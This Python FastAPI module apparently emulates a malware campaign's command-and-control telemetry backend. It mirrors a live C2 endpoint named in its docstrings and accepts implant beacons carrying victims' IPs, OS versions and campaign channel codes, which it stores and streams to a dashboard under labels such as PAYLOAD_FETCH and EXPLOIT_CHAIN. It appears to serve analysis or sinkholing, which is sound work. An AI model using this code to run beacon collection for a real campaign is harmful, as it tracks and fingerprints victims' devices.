"""
L1 — Campaign Telemetry Ingestion API

Aligned with the live-sample endpoints:
  POST /api/iptj           (legacy beacon)
  POST /api/ip-sync/sync   (ip + deviceVersion + channelCode)

Receives telemetry from Stage3 implants or test clients, persists into
the shared ring buffer + SQLite, and pushes each event to all SSE-connected
dashboards in real time.
"""

from __future__ import annotations

import time
import uuid
from typing import Any

from fastapi import APIRouter, Request
from pydantic import BaseModel, Field

from .console_crud import is_log_report_enabled
from .database import get_telemetry_stats, save_telemetry
from .state import AppState, TelemetryEvent, app_state

router = APIRouter(tags=["L1 · Telemetry"])


# ── Request / Response Schemas ───────────────────────────────────────────────

class TelemetrySyncRequest(BaseModel):
    """Matches the original C2 POST body from group.html `fqMaGkNS`."""
    channelCode: str = Field("", description="Campaign channel identifier, e.g. CHMLNID3W3546E607111")
    ip: str = Field("", description="Device public IP (v4 or v6)")
    deviceVersion: str = Field("", description="Parsed OS version string, e.g. 'iOS 17.2'")
    domain: str = Field("", description="Origin domain of the landing page")
    event_type: str = Field("", description="Optional explicit event type from client")


class TelemetryIptjRequest(BaseModel):
    """Legacy beacon body — accepts event_type and extra metadata."""
    channelCode: str = ""
    deviceVersion: str = ""
    domain: str = ""
    ip: str = ""
    event_type: str = ""
    extra: dict = Field(default_factory=dict)


class TelemetryEventOut(BaseModel):
    id: str
    timestamp: float
    channel_code: str
    device_version: str
    domain: str
    ip: str
    event_type: str


class TelemetryStatsOut(BaseModel):
    total_events: int
    events_per_hour: int
    unique_channels: int
    unique_ips: int
    latest_events: list[TelemetryEventOut]


# ── Helpers ──────────────────────────────────────────────────────────────────

EVENT_TYPE_MAP = {
    "CHMLNID": "DEVICE_FINGERPRINT",
    "ch_appstore": "BEACON_PING",
    "ch_safari": "BEACON_PING",
    "ch_deeplink": "PAYLOAD_FETCH",
    "ch_push": "IPC_HANDSHAKE",
    "ch_qr": "HOOK_INJECT",
    "ch_sms": "ENTITLEMENT_CHECK",
    "exploit_chain": "EXPLOIT_CHAIN",
}


def _classify_event_type(channel_code: str, explicit: str = "") -> str:
    if explicit:
        return explicit
    for prefix, etype in EVENT_TYPE_MAP.items():
        if channel_code.startswith(prefix) or channel_code == prefix:
            return etype
    return "BEACON_PING"


async def _ingest(body: dict, state: AppState) -> TelemetryEvent | None:
    if not is_log_report_enabled():
        return None

    event_type = _classify_event_type(
        body.get("channelCode", ""),
        body.get("event_type", ""),
    )
    event = TelemetryEvent(
        id=uuid.uuid4().hex[:12],
        timestamp=time.time(),
        channel_code=body.get("channelCode", ""),
        device_version=body.get("deviceVersion", ""),
        domain=body.get("domain", ""),
        ip=body.get("ip", ""),
        event_type=event_type,
        raw_body=body,
    )
    state.telemetry_events.append(event)
    state.telemetry_counter += 1
    state.blocked_today += 1

    save_telemetry({
        "event_id": event.id,
        "channel_code": event.channel_code,
        "device_version": event.device_version,
        "domain": event.domain,
        "ip": event.ip,
        "event_type": event.event_type,
        "raw_body": event.raw_body,
        "created_at": event.timestamp,
    })

    # Update L1 layer metrics
    elapsed_h = max((time.time() - state.start_time) / 3600, 0.01)
    state.layers["L1"].metrics["events_per_hour"] = int(state.telemetry_counter / elapsed_h)
    state.layers["L1"].metrics["queue_depth"] = 0

    # Push to SSE subscribers
    await state.broadcast_sse({
        "type": "telemetry",
        "data": {
            "id": event.id,
            "timestamp": event.timestamp,
            "channel_code": event.channel_code,
            "device_version": event.device_version,
            "domain": event.domain,
            "ip": event.ip,
            "event_type": event.event_type,
        },
    })
    await state.broadcast_layer_update("L1")

    return event


# ── Routes ───────────────────────────────────────────────────────────────────

@router.post("/api/ip-sync/sync", summary="L1 IP-Sync telemetry (primary)")
async def ip_sync(body: TelemetrySyncRequest, request: Request):
    """
    Primary telemetry endpoint aligned with the live C2:
      POST https://8df9.cc/api/ip-sync/sync
    Receives {channelCode, ip, deviceVersion} and optionally domain.
    """
    client_ip = body.ip or (request.client.host if request.client else "0.0.0.0")
    payload = body.model_dump()
    payload["ip"] = client_ip
    event = await _ingest(payload, app_state)
    if event is None:
        return {
            "code": 0,
            "msg": "ignored (log_report disabled)",
            "data": {"event_id": "", "received": False},
        }
    return {
        "code": 0,
        "msg": "ok",
        "data": {"event_id": event.id, "received": True},
    }


@router.post("/api/iptj", summary="L1 Legacy beacon (iptj)")
async def iptj(body: TelemetryIptjRequest, request: Request):
    """Legacy beacon endpoint. Accepts the same core fields."""
    client_ip = body.ip or (request.client.host if request.client else "0.0.0.0")
    payload = body.model_dump()
    payload["ip"] = client_ip
    event = await _ingest(payload, app_state)
    if event is None:
        return {"code": 0, "msg": "ignored (log_report disabled)", "event_id": ""}
    return {"code": 0, "msg": "ok", "event_id": event.id}


@router.get("/api/telemetry/stream", summary="L1 Telemetry history (last N)")
async def telemetry_history(limit: int = 100):
    """Return recent telemetry events for the dashboard terminal stream."""
    events = list(app_state.telemetry_events)[-limit:]
    return {
        "code": 0,
        "data": [
            {
                "id": e.id,
                "timestamp": e.timestamp,
                "channel_code": e.channel_code,
                "device_version": e.device_version,
                "domain": e.domain,
                "ip": e.ip,
                "event_type": e.event_type,
            }
            for e in events
        ],
    }


@router.get("/api/telemetry/stats", summary="L1 Telemetry aggregate stats")
async def telemetry_stats():
    db_stats = get_telemetry_stats()
    events = list(app_state.telemetry_events)
    elapsed_h = max((time.time() - app_state.start_time) / 3600, 0.01)
    total = max(app_state.telemetry_counter, db_stats["total_events"])

    return {
        "code": 0,
        "data": {
            "total_events": total,
            "events_per_hour": int(total / elapsed_h),
            "unique_channels": db_stats["unique_channels"],
            "unique_ips": db_stats["unique_ips"],
            "latest_events": [
                {
                    "id": e.id,
                    "timestamp": e.timestamp,
                    "channel_code": e.channel_code,
                    "device_version": e.device_version,
                    "domain": e.domain,
                    "ip": e.ip,
                    "event_type": e.event_type,
                }
                for e in events[-20:]
            ],
        },
    }
